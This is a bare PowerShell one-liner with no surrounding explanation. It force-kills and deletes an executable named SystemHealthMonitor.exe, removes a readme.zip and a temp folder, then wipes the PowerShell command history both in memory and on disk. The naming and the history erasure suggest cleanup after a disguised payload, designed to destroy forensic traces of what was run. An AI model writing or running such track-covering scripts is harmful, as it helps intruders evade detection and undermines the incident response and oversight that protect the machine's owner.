$shell=New-Object -ComObject Shell.Application;$wd="$env:TEMP\SystemHealth";$zip=Join-Path $shell.Namespace('shell:Downloads').Self.Path "readme.zip";$exe=Join-Path ([Environment]::GetFolderPath("Desktop")) "SystemHealthMonitor.exe";taskkill /f /im SystemHealthMonitor.exe;if(Test-Path $exe){Remove-Item $exe -Force;Write-Output "Deleted: $exe"}else{Write-Output "Not found: $exe"};if(Test-Path $zip){Remove-Item $zip -Force;Write-Output "Deleted: $zip"}else{Write-Output "Not found: $zip"};if(Test-Path $wd){Remove-Item $wd -Recurse -Force;Write-Output "Deleted folder: $wd"}else{Write-Output "Not found: $wd"};[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();$hist="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";if(Test-Path $hist){Remove-Item $hist -Force};exit
